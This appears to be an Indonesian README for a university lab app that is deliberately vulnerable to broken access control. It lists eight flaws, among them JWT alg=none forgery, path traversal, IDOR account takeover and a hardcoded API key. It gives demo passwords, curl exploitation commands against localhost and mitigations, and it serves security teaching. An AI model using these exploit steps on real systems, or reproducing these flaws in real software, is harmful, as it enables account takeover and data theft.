<div align="center">
  <img src="BAC9.png" alt="Preview Aplikasi LAB BAC #3" style="max-width:100%; border-radius:14px; border:1px solid #e5e7eb;">
  <h1>🧩 LAB-RED Team — Broken Access Control (Bagian 3)</h1>
  <p><b>Tugas Kuliah Keamanan Web</b> · dibuat oleh <b>kikikokok</b></p>
  <p>PHP 8 + MariaDB · OWASP Top 10 Web 2021 — <b>A01 Broken Access Control</b></p>
  <p>⚠️ Khusus praktikum lokal — jangan dijalankan di server publik/produksi.</p>
</div>

---

Kelanjutan [LAB BAC #1](https://github.com/ManuelKy08/lab-bac) &
[LAB BAC #2](https://github.com/ManuelKy08/lab-bac2). **Bagian 3** bergaya
**aplikasi SaaS/API modern (multi-cabang/multi-tenant)** dengan pola temuan yang
sering muncul di **program bug bounty (HackerOne dkk.)**:

| # | Endpoint | Pola Kerentanan | Kelas temuan BBP |
|---|----------|-----------------|------------------|
| 1 | [api/auth/token.php](api/auth/token.php) → [api/auth/me.php](api/auth/me.php) | JWT forgery (`alg=none`) / secret lemah | CWE-287 auth bypass |
| 2 | [api/gql.php](api/gql.php) | GraphQL over-fetch & alias batching | CWE-200 excess data |
| 3 | [rekap/list.php?org=2](rekap/list.php?org=2) | BOLA multi-tenant (ganti `org`) | CWE-639 missing tenant check |
| 4 | [download.php?f=CV-budi.txt](download.php?f=CV-budi.txt) | Path traversal + IDOR file pribadi | CWE-22 + CWE-639 |
| 5 | [api/akun/update.php](api/akun/update.php) | IDOR change-password → account takeover | CWE-639 write |
| 6 | [api/lupa/req.php](api/lupa/req.php) + [api/lupa/terapkan.php](api/lupa/terapkan.php) | Reset code tidak terikat akun | CWE-285 token binding |
| 7 | [share.php?t=4](share.php?t=4) | Share-link token berurutan → enumerasi | CWE-639 sequential ref |
| 8 | [admin/aksi.php](admin/aksi.php) (key di [assets/app.js](assets/app.js)) | Hardcoded API key di bundle JS | CWE-798 + CWE-306 |

## 🔎 Inti Pembelajaran

Di program bug bounty, hampir semua temuan BAC berhubungan dengan **API & sangat
bertambah banyak saat aplikasi multi-tenant**. Latihan ini melatih:

- **JWT**: memahami `alg`, verifikasi tanda tangan, dan secret yang lemah.
- **GraphQL**: over-fetching (server mengembalikan lebih banyak dari yang diminta)
  dan *aliases* untuk ambil banyak objek dalam satu query.
- **BOLA/tenant**: kapan "pindah cabang/org" harus datang dari sesi server,
  bukan dari parameter yang bisa diubah peminta.
- **File handler** yang tidak me-*whitelist* path dan tidak cek pemilik.
- **Binding token/binding kode reset** terhadap akun.
- **Secret yang ikut terkirim ke browser** (bundle JS / static asset).

## 🚀 Menjalankan

```bash
./jalankan.sh           # import DB lab_bac3 + server :8094
./jalankan.sh stop      # matikan
# buka http://127.0.0.1:8094
```

## 🔑 Akun Demo

| Username | Password | Cabang | Role |
|----------|----------|--------|------|
| `admin`  | `admin123` | Pusat (Jakarta)   | admin |
| `budi`   | `budi123`  | Pusat (Jakarta)   | kepala |
| `sari`   | `sari123`  | Pusat (Jakarta)   | staf |
| `riko`   | `riko123`  | Cabang (Bandung)  | kepala |
| `dewi`   | `dewi123`  | Cabang (Bandung)  | staf |

> Semua akun setara untuk eksploitasi — orang "pusat" bisa menyerang data
> cabang Bandung dan sebaliknya.

## 🧪 Alur Eksploitasi (ringkas)

```bash
B=http://127.0.0.1:8094

# 1. JWT forgery (alg=none) — token admin palsu
python3 tools/forge_none_jwt.py --uid 1 --role admin   # lalu pakai sebagai Bearer

# 2. GraphQL over-fetch — minta judul, dapat isi+password
curl -s -X POST $B/api/gql.php -H 'Content-Type: application/json' \
  -d '{"query":"{ a:laporan(id:3){judul} b:profil(id:1){nama} }"}'

# 3. BOLA — lihat rekap cabang Bandung tanpa login
curl -s "$B/rekap/list.php?org=2"

# 4. Traversal + file pribadi
curl -s "$B/download.php?f=CV-riko.txt"
curl -s "$B/download.php?f=../../database/lab_bac3.sql"

# 5. IDOR ganti password -> takeover
TOK=$(curl -s -X POST $B/api/auth/token.php -H 'Content-Type: application/json' \
  -d '{"username":"budi","password":"budi123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -s -X POST $B/api/akun/update.php -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"user_id":1,"password":"DIBOBOL"}'

# 6. Reset-code tak terikat akun (kode budi utk reset admin)
KODE=$(curl -s -X POST $B/api/lupa/req.php -H 'Content-Type: application/json' \
  -d '{"username":"budi"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["kode"])')
curl -s -X POST $B/api/lupa/terapkan.php -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"kode\":\"$KODE\",\"password\":\"BAJAK\"}"

# 7. Enumerasi share-link
for i in $(seq 1 8); do curl -s "$B/share.php?t=$i" | grep -oE '<h3>[^<]+'; done

# 8. API key dari JS -> admin
KEY=$(curl -s $B/assets/app.js | grep -oE 'API_KEY = "[^"]+"' | grep -oE '[a-zA-Z0-9-]+' | tail -1)
curl -s $B/admin/aksi.php -H "Authorization: Bearer $KEY"
```

## 📁 Struktur

```
lab-bac3/
├── api/                # endpoint API (target utama tipe 1,2,5,6)
├── admin/aksi.php      # T8
├── assets/             # style.css + app.js (bocor API key)
├── database/lab_bac3.sql
├── files/private/      # dokumen pribadi (T4)
├── includes/           # koneksi (util JWT sengaja rusak) + header/footer
├── rekap/list.php      # T3
├── share.php           # T7
├── download.php        # T4
├── tools/              # forge_none_jwt.py · forge_secret_jwt.py · crack_secret.py
├── jalankan.sh
└── LAPORAN.md          # laporan praktikum 3.1–3.8
```

## 🩹 Mitigasi (singkat)

1. **JWT**: wajib allowlist `alg` (`HS256` saja), pakai secret kuat & rahasia, validasi `exp`.
2. **GraphQL**: kurasi skema, jangan kembalikan kolom melebihi seleksi, terapkan authz per resolver.
3. **BOLA**: cabang/tenant diambil dari sesi/claim server — parameter `org` tak boleh dipercaya.
4. **File**: simpan di luar docroot, layani lewat map id→path, cek pemilik.
5. **Ubah password**: id target harus = identitas dari sesi/token.
6. **Reset code**: ikat kode ke akun & siapa yang memintanya; buang setelah 1x pakai + expiry.
7. **Share link**: token acak panjang, ada login, cek hak atas laporan.
8. **API key**: jangan di frontend; pakai per-user secret + rate limit.
